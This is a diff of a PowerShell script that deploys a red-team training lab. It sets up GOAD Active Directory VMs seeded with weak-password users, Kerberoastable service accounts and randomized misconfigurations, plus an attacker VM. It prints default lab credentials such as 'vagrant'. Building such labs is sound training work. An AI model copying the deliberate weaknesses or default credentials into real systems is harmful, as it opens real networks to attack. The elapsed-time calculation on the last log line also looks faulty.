+    Write-Host "  ╠══════════════════════════════════════════════════════════════════════════╣" -ForegroundColor Green
+    Write-Host "  ║                                                                          ║" -ForegroundColor Green
+    Write-Host "  ║  ENGAGEMENT                                                              ║" -ForegroundColor Cyan
+    Write-Host "  ║  ─────────────────────────────────────────────                           ║" -ForegroundColor DarkGray
+    Write-Host ("  ║  Client:    $($Config.clientName)".PadRight(75) + "║") -ForegroundColor White
+    Write-Host ("  ║  Domain:    $($Config.domain) ($domainNetbios)".PadRight(75) + "║") -ForegroundColor White
+    Write-Host ("  ║  Network:   $($Config.cidr) on $VMnet".PadRight(75) + "║") -ForegroundColor White
+    Write-Host ("  ║  Variant:   $($Config.labVariant)".PadRight(75) + "║") -ForegroundColor White
+    Write-Host "  ║                                                                          ║" -ForegroundColor Green
+    Write-Host "  ║  INITIAL ACCESS                                                          ║" -ForegroundColor Cyan
+    Write-Host "  ║  ─────────────────────────────────────────────                           ║" -ForegroundColor DarkGray
+    Write-Host ("  ║  Username:  $domainNetbios\$($Config.lowPrivUser.username)".PadRight(75) + "║") -ForegroundColor Yellow
+    Write-Host ("  ║  Password:  $($Config.lowPrivUser.password)".PadRight(75) + "║") -ForegroundColor Yellow
+    Write-Host "  ║                                                                          ║" -ForegroundColor Green
+    Write-Host "  ║  INFRASTRUCTURE                                                          ║" -ForegroundColor Cyan
+    Write-Host "  ║  ─────────────────────────────────────────────                           ║" -ForegroundColor DarkGray
+    Write-Host ("  ║  DC01:      $($NetInfo.DC1)".PadRight(75) + "║") -ForegroundColor White
+    Write-Host ("  ║  DC02:      $($NetInfo.DC2)".PadRight(75) + "║") -ForegroundColor White
+    Write-Host ("  ║  SRV02:     $($NetInfo.SRV02)".PadRight(75) + "║") -ForegroundColor White
+    Write-Host ("  ║  Attacker:  $($NetInfo.Attacker)".PadRight(75) + "║") -ForegroundColor White
+    Write-Host "  ║                                                                          ║" -ForegroundColor Green
+    Write-Host "  ║  AD STATISTICS                                                           ║" -ForegroundColor Cyan
+    Write-Host "  ║  ─────────────────────────────────────────────                           ║" -ForegroundColor DarkGray
+    Write-Host ("  ║  Users:         $($ADUsers.Count) total".PadRight(75) + "║") -ForegroundColor White
+    Write-Host ("  ║  Weak Passwords: $weakCount ($([math]::Round($weakCount / [math]::Max($ADUsers.Count,1) * 100))%)".PadRight(75) + "║") -ForegroundColor Red
+    Write-Host ("  ║  Service Accts:  $($ServiceAccounts.Count) (Kerberoastable)".PadRight(75) + "║") -ForegroundColor Red
+    Write-Host ("  ║  Misconfigs:     $($Misconfigs.Count) active".PadRight(75) + "║") -ForegroundColor Red
+    Write-Host "  ║                                                                          ║" -ForegroundColor Green
+    Write-Host "  ║  HANDOFF PACKAGE                                                         ║" -ForegroundColor Cyan
+    Write-Host "  ║  ─────────────────────────────────────────────                           ║" -ForegroundColor DarkGray
+    Write-Host ("  ║  $HandoffDir".PadRight(75) + "║") -ForegroundColor Green
+    Write-Host "  ║                                                                          ║" -ForegroundColor Green
+    Write-Host "  ║  QUICK START                                                             ║" -ForegroundColor Cyan
+    Write-Host "  ║  ─────────────────────────────────────────────                           ║" -ForegroundColor DarkGray
+    Write-Host ("  ║  ssh vagrant@$($NetInfo.Attacker)  (password: vagrant)".PadRight(75) + "║") -ForegroundColor Yellow
+    Write-Host "  ║                                                                          ║" -ForegroundColor Green
+    Write-Host "  ║  MANAGEMENT                                                              ║" -ForegroundColor Cyan
+    Write-Host "  ║  ─────────────────────────────────────────────                           ║" -ForegroundColor DarkGray
+    Write-Host ("  ║  Reset:   .\Reset-Lab.ps1".PadRight(75) + "║") -ForegroundColor Yellow
+    Write-Host ("  ║  Status:  .\Check-LabStatus.ps1".PadRight(75) + "║") -ForegroundColor Yellow
+    Write-Host ("  ║  Destroy: .\Deploy-RedTeamLab.ps1 -Destroy".PadRight(75) + "║") -ForegroundColor Yellow
+    Write-Host "  ║                                                                          ║" -ForegroundColor Green
+    Write-Host "  ╚══════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
     Write-Host ""
 }
 
-# ─── MAIN EXECUTION ──────────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+# MAIN
+# ═══════════════════════════════════════════════════════════════════════════════
 
 function Main {
     $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
 
     Initialize-Logging
 
-    Write-Banner "INSTA-INTERNAL-LABINATOR v$SCRIPT_VERSION"
-    Write-Log "Starting deployment at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-    Write-Log "Script directory: $SCRIPT_DIR"
+    Write-Host ""
+    Write-Host "  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓" -ForegroundColor Cyan
+    Write-Host "  ┃         INSTA-INTERNAL-LABINATOR v$SCRIPT_VERSION                                  ┃" -ForegroundColor Cyan
+    Write-Host "  ┃         One-Click Red Team Lab Generator                                ┃" -ForegroundColor DarkCyan
+    Write-Host "  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛" -ForegroundColor Cyan
+    Write-Host ""
+    Write-Log "Starting at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+    Write-Log "Script directory: $SCRIPT_DIR" "DETAIL"
+    Write-Log "Log file: $LOG_FILE" "DETAIL"
 
     # Handle destroy mode
     if ($Destroy) {
         Remove-Lab
+        Stop-Transcript -ErrorAction SilentlyContinue
         return
     }
 
     # Step 1: Prerequisites
     Test-Prerequisites
 
-    # Step 2: Load / generate config
-    Write-Banner "LOADING ENGAGEMENT CONFIGURATION"
+    # Step 2: Config & Randomization Seed
+    Write-Banner "LOADING ENGAGEMENT CONFIGURATION" -Step 2 -Total 8
+    Initialize-RandomSeed -Seed $MisconfigSeed
     $config = Read-ClientConfig -Path $ConfigPath
-    Write-Log "Client: $($config.clientName)" "SUCCESS"
-    Write-Log "Domain: $($config.domain)" "SUCCESS"
-    Write-Log "CIDR:   $($config.cidr)" "SUCCESS"
-    Write-Log "User:   $($config.lowPrivUser.username)" "SUCCESS"
-    Write-Log "Lab:    $($config.labVariant)" "SUCCESS"
 
-    # Step 3: Generate randomized AD data
-    Write-Banner "GENERATING RANDOMIZED AD ENVIRONMENT"
-    $adUsers = New-RandomADUsers
-    Write-Log "Generated $($adUsers.Count) domain users ($(@($adUsers | Where-Object { $_.WeakPW }).Count) with weak passwords)"
+    Write-Host ""
+    Write-Log "Client:  $($config.clientName)" "SUCCESS"
+    Write-Log "Domain:  $($config.domain)" "SUCCESS"
+    Write-Log "CIDR:    $($config.cidr)" "SUCCESS"
+    Write-Log "User:    $($config.lowPrivUser.username)" "SUCCESS"
+    Write-Log "Lab:     $($config.labVariant)" "SUCCESS"
+    Write-Host ""
+
+    # Step 3: Generate AD data
+    Write-Banner "GENERATING RANDOMIZED AD ENVIRONMENT" -Step 3 -Total 8
+    $adUsers = New-RandomADUsers -CompanyName $config.clientName
+    $weakCount = @($adUsers | Where-Object { $_.WeakPW }).Count
+    $svcCount = @($adUsers | Where-Object { $_.AccountType -eq "Service" }).Count
+    $admCount = @($adUsers | Where-Object { $_.AccountType -eq "Admin" }).Count
+    $tmpCount = @($adUsers | Where-Object { $_.AccountType -eq "Temporary" }).Count
+    Write-Log "Users: $($adUsers.Count) total ($weakCount weak, $svcCount svc, $admCount admin, $tmpCount temp)" "SUCCESS"
 
     $svcAccounts = New-RandomServiceAccounts
-    Write-Log "Generated $($svcAccounts.Count) Kerberoastable service accounts"
+    Write-Log "Kerberoastable service accounts: $($svcAccounts.Count)" "SUCCESS"
 
     $misconfigs = New-RandomMisconfigurations
-    Write-Log "Activated $($misconfigs.Count) misconfigurations"
+    $critCount = @($misconfigs | Where-Object { $_.Severity -eq "Critical" }).Count
+    $highCount = @($misconfigs | Where-Object { $_.Severity -eq "High" }).Count
+    Write-Log "Misconfigurations: $($misconfigs.Count) active ($critCount critical, $highCount high)" "SUCCESS"
 
-    # Step 4: Network setup
+    # Step 4: Network
     $netInfo = Get-NetworkFromCIDR -CIDR $config.cidr
-    $vmnet = Initialize-VMwareNetwork -NetInfo $netInfo -CIDR $config.cidr
 
-    # Step 5: Deploy GOAD
-    Deploy-GOAD -Config $config -NetInfo $netInfo -VMnet $vmnet `
-                -ADUsers $adUsers -ServiceAccounts $svcAccounts -Misconfigs $misconfigs
+    if (-not $HandoffOnly) {
+        $vmnet = Initialize-VMwareNetwork -NetInfo $netInfo -CIDR $config.cidr
 
-    # Step 6: Deploy Attacker VM
-    Deploy-AttackerVM -Config $config -NetInfo $netInfo -VMnet $vmnet
+        # Step 5: GOAD
+        if (-not $SkipGOAD) {
+            Deploy-GOAD -Config $config -NetInfo $netInfo -VMnet $vmnet `
+                        -ADUsers $adUsers -ServiceAccounts $svcAccounts -Misconfigs $misconfigs
+        } else {
+            Write-Log "Skipping GOAD deployment (-SkipGOAD)." "WARN"
+        }
 
-    # Step 7: Snapshots
-    if (-not $SkipSnapshots) {
-        New-VMwareSnapshots -Timestamp $timestamp
+        # Step 6: Attacker VM
+        if (-not $SkipAttacker) {
+            Deploy-AttackerVM -Config $config -NetInfo $netInfo -VMnet $vmnet
+        } else {
+            Write-Log "Skipping Attacker VM (-SkipAttacker)." "WARN"
+        }
+
+        # Step 7: Snapshots
+        if (-not $SkipSnapshots) {
+            New-VMwareSnapshots -Timestamp $timestamp
+        }
+    } else {
+        $vmnet = "vmnet2"
+        Write-Log "Handoff-only mode — skipping VM deployment." "WARN"
     }
 
-    # Step 8: Generate handoff package
+    # Step 8: Handoff package (always generated)
     $handoffDir = New-HandoffPackage -Config $config -NetInfo $netInfo -VMnet $vmnet `
                                       -ADUsers $adUsers -ServiceAccounts $svcAccounts `
                                       -Misconfigs $misconfigs -Timestamp $timestamp
 
-    # Step 9: Summary
+    # Summary
     Show-Summary -Config $config -NetInfo $netInfo -VMnet $vmnet `
                  -HandoffDir $handoffDir -ADUsers $adUsers `
                  -ServiceAccounts $svcAccounts -Misconfigs $misconfigs `
                  -Timestamp $timestamp
 
-    Write-Log "Deployment complete! Check the handoff package at: $handoffDir" "SUCCESS"
-    Write-Log "Log file: $LOG_FILE" "INFO"
+    Write-Log "Deployment complete! Total time: $((Get-Date) - (Get-Date $timestamp.Substring(0,8) -Format 'yyyyMMdd'))" "SUCCESS"
+    Write-Log "Log: $LOG_FILE" "DETAIL"
 
     Stop-Transcript -ErrorAction SilentlyContinue
 }
